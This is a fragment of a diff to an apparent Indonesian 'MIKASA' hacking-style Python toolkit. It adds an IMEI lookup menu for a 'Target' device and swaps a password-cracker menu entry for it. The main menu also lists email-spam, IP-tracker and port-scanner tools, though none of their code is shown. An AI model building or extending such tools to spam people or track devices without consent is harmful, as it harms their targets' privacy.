+{H}│  {P}[{K}0{P}] Kembali ke MIKASA                             │
+{H}│                                                            │
+{H}└────────────────────────────────────────────────────────────┘{RESET}
+""")
+
+    while True:
+        banner_imei()
+        print(f"{P}⟬{K}𝗣𝗶𝗹𝗶𝗵 𝗠𝗲𝗻𝘂{P} ⟭{H}➤➤{RESET} ", end="")
+        pilihan = input().strip()
+        
+        if pilihan == "0":
+            print(f"\n{K}[!] Kembali ke MIKASA...{RESET}")
+            time.sleep(1)
+            break
+        
+        elif pilihan == "1":
+            os.system('clear')
+            print(f"""
+{H}┌────────────────────────────────────────────────────────────┐
+{H}│{P}                   🔍 CEK IMEI                          {H}│
+{H}├────────────────────────────────────────────────────────────┤
+{H}│{P}  ────────────────[ {H}I N F O {P} ]────────────────{H}  │
+{H}│{P}  📱 Masukkan 15 digit IMEI device Target              {H}│
+{H}│{P}  ⚠️  Limit: Harus {K}15 digit angka {P}tanpa spasi     {H}│
+{H}│{P}  📌 Contoh: {K}123456789012345                        {H}│
+{H}└────────────────────────────────────────────────────────────┘{RESET}
+""")
+            print(f"{P}⟬{K}𝗠𝗔𝗦𝗨𝗞𝗞𝗔𝗡 𝗜𝗠𝗘𝗜{P} ⟭{H}➤➤{RESET} ", end="")
+            imei = input().strip()
+            
+            if not imei:
+                print(f"\n{K}[!] IMEI tidak boleh kosong!{RESET}")
+                time.sleep(1)
+                continue
+            
+            if len(imei) != 15:
+                print(f"\n{K}[!] IMEI harus {H}15 digit{K}! (Anda memasukkan {H}{len(imei)}{K} digit){RESET}")
+                time.sleep(2)
+                continue
+            
+            if not imei.isdigit():
+                print(f"\n{K}[!] IMEI harus berupa {H}angka{K}!{RESET}")
+                time.sleep(2)
+                continue
+            
+            result = cek_imei(imei)
+            print(result['formatted'])
+            if result['success']:
+                print(f"\n{H}✅ Hasil tersimpan di: {K}{result['txt_file']}{RESET}")
+            
+            print(f"\n{K}[!] Tekan Enter untuk kembali...{RESET}")
+            input()
+        
+        elif pilihan == "2":
+            lihat_history_imei()
+        
+        else:
+            print(f"\n{K}[!] Pilihan tidak valid!{RESET}")
+            time.sleep(1)
 
 def tool_ip_tracker():
     os.system('clear')
@@ -1525,7 +2784,7 @@ def menu_utama():
         "4": tool_email_spam, "04": tool_email_spam,
         "5": tool_decoder, "05": tool_decoder,
         "6": tool_encryptor, "06": tool_encryptor,
-        "7": tool_password_cracker, "07": tool_password_cracker,
+        "7": tool_imei_checker, "07": tool_imei_checker,
         "8": tool_ip_tracker, "08": tool_ip_tracker,
         "9": tool_port_scanner, "09": tool_port_scanner,
         "10": tool_bot_telegram,
